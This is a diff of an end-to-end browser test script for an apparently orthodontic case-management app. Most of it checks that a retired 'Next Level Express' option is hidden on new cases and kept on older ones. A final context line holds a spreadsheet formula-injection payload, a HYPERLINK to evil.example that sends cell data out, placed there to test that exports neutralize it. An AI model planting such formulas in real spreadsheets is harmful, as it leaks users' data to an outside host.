@@ -480,6 +480,20 @@ async function openByName(p, name) {
   await owner.click('#drawer [data-act=closeDrawer] >> nth=0');
   check((await owner.locator('select[data-f=type] option[value=inbrace]').count()) === 1, 'the filter offers InBrace while such a case is open');
 
+  console.log('\n# Next Level Express retired');
+  await owner.click('.topBar [data-act=newCase]'); await owner.waitForSelector('#ncForm');
+  await owner.click('#ncForm .tt[data-tile=oliv]');
+  check(await owner.isVisible('.pickRow[data-g=extras] .pick:has-text("No elastics")') && (await owner.locator('.pickRow[data-g=extras] .pick:has-text("Next Level Express")').count()) === 0, 'New case has no Next Level Express button');
+  await owner.click('.modal [data-act=closeModal]');
+  await owner.evaluate(() => B.createCase({ type: 'oliv', patient: 'Nora Expressold', stage: 'submit', extras: ['Next Level Express (5 aligners or less)'], comments: [], createdAt: Date.now(), createdBy: meSid() }));
+  await openByName(owner, 'Nora Expressold');
+  await owner.click('#drawer [data-act=edit]'); await owner.waitForSelector('#drawer .cf');
+  check((await owner.getAttribute('#drawer .pickRow[data-g=extras] .pick:has-text("Next Level Express")', 'aria-pressed')) === 'true', 'an older case keeps its Next Level Express choice when edited');
+  await owner.fill('#drawer #cf-notes', 'express-edit-ok');
+  await owner.click('[data-act=saveEdit]'); await owner.waitForSelector('#drawer .stepper', { timeout: 20000 });
+  check(await owner.isVisible('#drawer .badge:has-text("Next Level Express")') && await owner.isVisible('#drawer .txt:has-text("express-edit-ok")'), 'saving the edit doesn’t drop it');
+  await owner.click('#drawer [data-act=closeDrawer] >> nth=0');
+
   console.log('\n# Spreadsheet-formula text is neutralized in the export');
   await owner.fill('#q', ''); await newCase(owner, { type: 'misc', patient: '=HYPERLINK("http://evil.example/?"&A1,"x")' });
 
